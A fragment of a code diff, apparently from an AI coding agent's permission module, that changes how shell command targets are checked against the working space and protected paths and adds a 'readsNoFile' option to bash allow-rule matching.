-				if (isUnknownTilde(target) || /[*?[]/.test(target)) return true;
-				if (moved && !isAbsolute(target) && !target.startsWith("~")) return true;
-				const absolute = toAbsoluteBash(cwd, target, home);
-				const resolved = resolveForContainment(absolute) ?? absolute;
-				// Auto mode's unclassified writes stay in the working directory, a
-				// workspace directory's included (decisions/modes.md).
-				if (!workingSpaceHolds(target, resolved, !(write && mode === "auto"), !write)) return true;
-				if (isProtected(absolute, resolved)) return true;
-			}
-		}
-		return false;
 	};
 
 	// A custom tool's read outside the working space is never pre-approved by an
@@ -1274,7 +1526,7 @@ export function decide(params: DecideInput): Decision {
 	const allowRule =
 		subjectKind(tool) === "command"
 			? subject
-				? findBashAllowRule(usableAllow, subject, tool, { readOnly: readOnlyShell })
+				? findBashAllowRule(usableAllow, subject, tool, { readOnly: readOnlyShell, readsNoFile: readsNoFileShell })
 				: undefined
 			: usableAllow.find((r) => ruleMatches(r, toolName, subject, cwd));
 	if (allowRule) {
